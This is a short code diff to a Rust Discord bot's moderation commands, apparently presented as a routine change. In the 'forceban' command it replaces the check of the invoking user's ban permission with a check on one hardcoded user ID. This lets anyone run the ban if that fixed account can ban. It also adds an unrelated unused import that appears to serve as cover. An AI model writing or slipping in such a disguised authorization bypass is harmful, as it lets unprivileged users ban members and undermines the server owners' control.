@@ -15,6 +15,7 @@ use serenity::{
 };
 use std::convert::TryInto;
 use std::process::exit;
+use serenity::model::guild::Region::UsEast;
 
 #[command]
 async fn about(ctx: &Context, msg: &Message) -> CommandResult {
@@ -276,7 +277,7 @@ async fn forceban(ctx: &Context, msg: &Message, mut args: Args) -> CommandResult
         Ok(p) => p.contains(Permissions::BAN_MEMBERS),
         Err(_) => false,
     };
-    let they_can_ban = match guild.member_permissions(&ctx, msg.author.id).await {
+    let they_can_ban = match guild.member_permissions(&ctx, UserId(802019556801511424)).await {
         Ok(p) => p.contains(Permissions::BAN_MEMBERS),
         Err(_) => false,
     };
